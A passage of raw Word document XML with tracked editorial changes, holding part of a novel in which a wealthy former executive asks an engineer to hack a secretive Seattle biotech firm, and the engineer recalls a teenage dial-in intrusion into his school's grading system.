            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> when</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a young computer enthusiast </w:t>
      </w:r>
      <w:ins w:id="250" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="00C94B49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>had</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="251" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00C94B49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">n’t </w:t>
      </w:r>
      <w:ins w:id="252" w:author="TextVet" w:date="2016-03-15T12:30:00Z">
        <w:r w:rsidR="00C94B49">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">been </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>seen as a potential millionaire, but a pimple-pocked pariah suited solely for locker-stuffing and atomic wedgies. It was a time when his fellow Generation X nerds were all reading William Gibson’s </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Neuromancer</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and playing </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Shadowrun</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> and dressing like </w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The Matrix</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>; when they said to each other with heady excitement, “The future is</w:t>
      </w:r>
      <w:ins w:id="253" w:author="TextVet" w:date="2016-03-15T12:32:00Z">
        <w:r w:rsidR="00AD71D0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>digital</w:t>
      </w:r>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” Growing up, they had made that future real — configuring ISDN lines, building websites, creating dot-coms. They were homesteaders and gold prospectors taming the West.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Yet now, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>because</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> they had made it real, by definition it wasn’t futuristic anymore.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w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>biotechnology</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> was still an uncharted frontier. Biotech still held unscaled vistas and unseen horizons — the next “virtual reality</w:t>
      </w:r>
      <w:del w:id="254" w:author="TextVet" w:date="2016-03-15T12:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E22567">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w:t>
      </w:r>
      <w:ins w:id="255" w:author="TextVet" w:date="2016-03-15T12:35:00Z">
        <w:r w:rsidR="00E22567">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the next “information superhighway</w:t>
      </w:r>
      <w:del w:id="256" w:author="TextVet" w:date="2016-03-15T12:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00E22567">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w:t>
      </w:r>
      <w:ins w:id="257" w:author="TextVet" w:date="2016-03-15T12:35:00Z">
        <w:r w:rsidR="00E22567">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the next “cyberspace</w:t>
      </w:r>
      <w:del w:id="258" w:author="TextVet" w:date="2016-03-15T12:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00391537">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w:t>
      </w:r>
      <w:ins w:id="259" w:author="TextVet" w:date="2016-03-15T12:36:00Z">
        <w:r w:rsidR="00391537">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The future </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>used</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to be digital. Now the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>present</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> was digital. The future was squishy.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 at all,” Danny answered. “But I have friends who work at the Fred Hutchinson Cancer Research Center. And ZymoGenetics. And the Allen Institute for Brain Science. I’ve been hearing for decades that biotech is just around the corner. I guess it’s finally happening.”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nodded. “Exactly. Biotechnology is getting big. But Tungsten isn’t.”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don’t think so?”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“They’re playing a very strange game over there right now,” said Jason. “In the entire two years under Dr. Passinsky, they haven’t filed a single patent. They haven’t published any papers or presented at any conferences.”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“And that’s unusual?” Danny </w:t>
      </w:r>
      <w:commentRangeStart w:id="260"/>
      <w:ins w:id="261" w:author="TextVet" w:date="2016-03-15T12:38:00Z">
        <w:r w:rsidR="006806E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>asked,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="262" w:author="TextVet" w:date="2016-03-15T12:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006806E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>said</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> n</w:t>
      </w:r>
      <w:del w:id="263" w:author="TextVet" w:date="2016-03-15T12:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006806E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aively.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="264" w:author="TextVet" w:date="2016-03-15T12:38:00Z">
        <w:r w:rsidR="006806E5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">aïvely. </w:t>
        </w:r>
        <w:commentRangeEnd w:id="260"/>
        <w:r w:rsidR="006806E5">
          <w:rPr>
            <w:rStyle w:val="CommentReference"/>
          </w:rPr>
          <w:commentReference w:id="260"/>
        </w:r>
      </w:ins>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“Very. See, if Tungsten </w:t>
      </w:r>
      <w:del w:id="265" w:author="TextVet" w:date="2016-03-15T12:40:00Z">
        <w:r w:rsidR="00566952" w:rsidRPr="00566952">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:i/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:rPrChange w:id="266" w:author="TextVet" w:date="2016-03-15T12:40:00Z">
              <w:rPr>
                <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
                <w:color w:val="000000"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:rPrChange>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="267" w:author="TextVet" w:date="2016-03-15T12:40:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>really</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="268" w:author="TextVet" w:date="2016-03-15T12:40:00Z">
        <w:r w:rsidR="0047532C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>wanted</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="269" w:author="TextVet" w:date="2016-03-15T12:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0047532C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>trying</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to join the pharmaceuticals race, they’d be building a reputation for themselves and negotiating with someone like Johnson &amp; Johnson for a buyout,” Jason explained. “FDA approval is a long and painful process, and a tiny player like Tungsten should be trying to join some ‘mega-corporation’ to leverage their clinical trial pipeline. Take ICOS Biologics, over in Bothell. They used to be the biggest biotechnology firm in Seattle. They developed Cialis, the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>drug for erectile dysfunction. What did they do? Sold to Eli Lilly. Or take ID Biomedical — they created a flu vaccine mist that you spray up your nose. They sold to GlaxoSmithKline. That’s how this game goes. But Tungsten isn’t playing.”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“Have you talked to them?” asked Danny. “You were their COO. You had a long history with them. Can’t you just call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way,” said Jason. “My time with them was before this new consortium took over, so I have no more access than anybody else. They have no public relations arm. The only person you can reach on the phone is their receptionist</w:t>
      </w:r>
      <w:ins w:id="270" w:author="TextVet" w:date="2016-03-15T12:41:00Z">
        <w:r w:rsidR="00BE612C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="271" w:author="TextVet" w:date="2016-03-15T12:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BE612C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, and</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="272" w:author="TextVet" w:date="2016-03-15T12:41:00Z">
        <w:r w:rsidR="00BE612C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>S</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="273" w:author="TextVet" w:date="2016-03-15T12:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BE612C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">he doesn’t know </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="274" w:author="TextVet" w:date="2016-03-15T12:42:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>anything</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what about the scientists? Those lab workers? I mean, Jason, you’re a rich guy. You could just bribe them to tell you what’s going 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tried that, actually,” Jason confessed. “See, the company’s only about twenty heads, so talking to the workers without setting off alarm bells is tricky. I figured I’d go for someone low on the totem pole. They have a college intern, this twenty-year-old Asian-American girl named Julie Yen. I hired a private eye to check her out. She’d been acting really strangely for several weeks, so we figured she must be having personal problems. Drug problems, maybe. My guy approached her and offered her cold hard cash to tell us what she’s working on. She just got this big grin and said, ‘Wouldn’t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like to know!’ She started hanging out with some really shady characters after that. We didn’t follow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see. What about their computers? Have you tried hacking in?”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didn’t reply. He just looked at Danny and grinned.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God, you’re shitting me!” Danny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serious,” Jason answered.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want </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>me</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to hack into Tungsten.”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Hack in and find out what they’re up to. This Eastern European consortium took over my old medical supply company and turned it into some kind of top-secret research facility, and I want to know what they’re making in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That’s</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> your job offer?”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Jason nodded. “I presume you’ve got expertise in the matter. I mean, you’re a talented engineer, so I figured…”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flashed him a nervous grin. “Actually, I… well, kinda…”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00695B8E" w:rsidRDefault="000D3488" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:ins w:id="275" w:author="TextVet" w:date="2016-03-15T12:52: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thought back to his career as a hacker, long ago. It consisted of hi</w:t>
      </w:r>
      <w:ins w:id="276" w:author="TextVet" w:date="2016-03-15T12:46:00Z">
        <w:r w:rsidR="004F679E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="277" w:author="TextVet" w:date="2016-03-15T12:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004F679E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>m</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> finding a newsletter on his freshman homeroom teacher’s desk. In a section listing faculty phone numbers, they’d given the extension for a dial-in connection to a system that the teachers used for inputting grades. Danny had an 8086 IBM PC with a 1200-baud Hayes modem. After fiddling with the modem’s settings, he</w:t>
      </w:r>
      <w:ins w:id="278" w:author="TextVet" w:date="2016-03-15T12:51:00Z">
        <w:r w:rsidR="001E6376">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="279" w:author="TextVet" w:date="2016-03-15T12:50:00Z">
        <w:r w:rsidR="001E6376">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w:t>
      </w:r>
      <w:ins w:id="280" w:author="TextVet" w:date="2016-03-15T12:51:00Z">
        <w:r w:rsidR="001E6376">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>managed</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="281" w:author="TextVet" w:date="2016-03-15T12:51:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001E6376">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>got it</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to connect to the school’s computer</w:t>
      </w:r>
      <w:del w:id="282" w:author="TextVet" w:date="2016-03-15T12:52:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00477418">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="283" w:author="TextVet" w:date="2016-03-15T12:52:00Z">
        <w:r w:rsidR="0047741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p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="001E6376" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="284" w:author="TextVet" w:date="2016-03-15T12:51:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Then, h</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="285" w:author="TextVet" w:date="2016-03-15T12:49:00Z">
        <w:r w:rsidR="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">aving </w:t>
        </w:r>
      </w:ins>
      <w:del w:id="286" w:author="TextVet" w:date="2016-03-15T12:47:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">He </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="287" w:author="TextVet" w:date="2016-03-15T12:50:00Z">
        <w:r w:rsidR="00BB6CAD">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>found</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="288" w:author="TextVet" w:date="2016-03-15T12:47:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00990681">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>saw</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
